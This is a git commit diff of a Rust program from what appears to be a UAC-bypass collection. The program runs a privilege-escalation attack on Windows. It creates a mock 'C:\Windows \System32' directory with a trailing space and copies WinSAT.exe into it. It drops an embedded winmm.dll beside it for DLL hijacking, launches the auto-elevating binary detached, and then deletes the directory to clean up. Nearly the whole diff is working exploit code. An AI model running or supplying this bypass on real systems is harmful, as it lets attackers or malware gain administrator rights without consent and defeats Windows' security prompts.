ef4348ca1f18f4bec9f9d685ea7df79a179132d8
Jay Jackson <jj@jj.is-a.dev>
2022-06-30 15:19:59 -0400

    use vars

--- uac-bypasses/mock-trusted-directories/src/main.rs
+++ uac-bypasses/mock-trusted-directories/src/main.rs
@@ -1,31 +1,54 @@
-use std::{fs, io::Error, os::windows::process::CommandExt, process::Command};
+use std::{fs, os::windows::process::CommandExt, process::Command};
 
 static WINMM_DLL: &[u8] = std::include_bytes!(env!("CARGO_CDYLIB_FILE_DLL"));
 
-pub fn main() -> Result<(), Error> {
-    println!(r"[+] Creating fake directory C:\Windows \System32\...");
-    fs::create_dir_all(r"C:\Windows \")
-        .and_then(|_| fs::create_dir_all(r"C:\Windows \System32\"))?;
+const DETACHED_PROCESS: u32 = 0x00000008;
 
-    println!(r"[+] Copying C:\Windows\System32\WinSAT.exe to C:\Windows \System32\WinSAT.exe...");
-    fs::copy(
-        r"C:\Windows\System32\WinSAT.exe",
-        r"C:\Windows \System32\WinSAT.exe",
-    )
-    .map_err(|err| println!(r"[-] Error copying C:\Windows\System32\WinSAT.exe: {}", err))
-    .ok();
+pub fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let windir = std::path::Path::new(r"C:\Windows\System32");
+    let fake_windir = std::path::Path::new(r"C:\Windows \System32");
 
-    println!(r"[+] Creating C:\Windows \System32\winmm.dll...");
-    fs::write(r"C:\Windows \System32\winmm.dll", WINMM_DLL)
-        .map_err(|err| println!("[-] Error creating the fake dll: {}", err))
-        .ok();
+    println!("[+] Creating fake directory {}...", fake_windir.display());
+    fs::create_dir_all(fake_windir.parent().unwrap())
+        .and_then(|_| fs::create_dir_all(fake_windir))?;
 
-    println!(r"[+] Starting C:\Windows \System32\WinSAT.exe...");
-    // TODO: don't use cmd.exe
+    let winsat = &*windir.join("WinSAT.exe");
+    let fake_winsat = &*fake_windir.join("WinSAT.exe");
+
+    println!(
+        "[+] Copying {} to {}...",
+        winsat.display(),
+        fake_winsat.display()
+    );
+
+    if let Err(err) = fs::copy(winsat, fake_winsat) {
+        println!(
+            "[!] Error copying {} to {}: {err}",
+            winsat.display(),
+            fake_winsat.display()
+        );
+        std::process::exit(1);
+    };
+
+    let fake_winmm = &*fake_windir.join("winmm.dll");
+
+    println!("[+] Creating {}...", fake_winmm.display());
+    if let Err(err) = fs::write(fake_winmm, WINMM_DLL) {
+        println!("[!] Error writing {}: {err}", fake_winmm.display());
+        std::process::exit(1);
+    }
+
+    println!("[+] Starting {}...", fake_winsat.display());
+
     Command::new("cmd.exe")
-        .args(["/C", r"C:\Windows \System32\WinSAT.exe"])
-        .creation_flags(0x00000008)
+        .args(["/C", fake_winsat.to_str().unwrap()])
+        .creation_flags(DETACHED_PROCESS)
         .spawn()?;
+
+    if let Err(err) = fs::remove_dir_all(fake_windir) {
+        println!("[!] Error removing {}: {err}", fake_windir.display());
+        std::process::exit(1);
+    }
 
     Ok(())
 }
